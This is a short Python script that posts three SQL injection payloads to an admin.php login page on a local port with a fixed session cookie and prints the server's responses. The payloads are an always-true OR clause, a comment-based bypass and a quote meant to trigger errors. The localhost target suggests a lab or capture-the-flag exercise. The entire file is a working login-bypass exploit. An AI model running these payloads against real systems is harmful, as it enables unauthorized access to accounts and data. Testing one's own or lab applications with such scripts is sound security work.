import urllib.request
import urllib.parse

url = "http://127.0.0.1:32817/admin.php"

print("Test 1: SQL injection OR 1=1")
data = urllib.parse.urlencode({"username": "admin' OR '1'='1", "password": "test"}).encode()
req = urllib.request.Request(url, data=data, headers={"Cookie": "PHPSESSID=1be838a0271333bc548391c1dae99848"})
try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response:\n{body}\n")
except Exception as e:
    print(f"Error: {e}\n")

print("Test 2: SQL comment bypass")
data = urllib.parse.urlencode({"username": "admin'--", "password": ""}).encode()
req = urllib.request.Request(url, data=data, headers={"Cookie": "PHPSESSID=1be838a0271333bc548391c1dae99848"})
try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response:\n{body}\n")
except Exception as e:
    print(f"Error: {e}\n")

print("Test 3: SQL error trigger")
data = urllib.parse.urlencode({"username": "admin'", "password": "test"}).encode()
req = urllib.request.Request(url, data=data, headers={"Cookie": "PHPSESSID=1be838a0271333bc548391c1dae99848"})
try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode()
        print(f"Status: {response.status}")
        print(f"Response:\n{body}\n")
except Exception as e:
    print(f"Error: {e}\n")

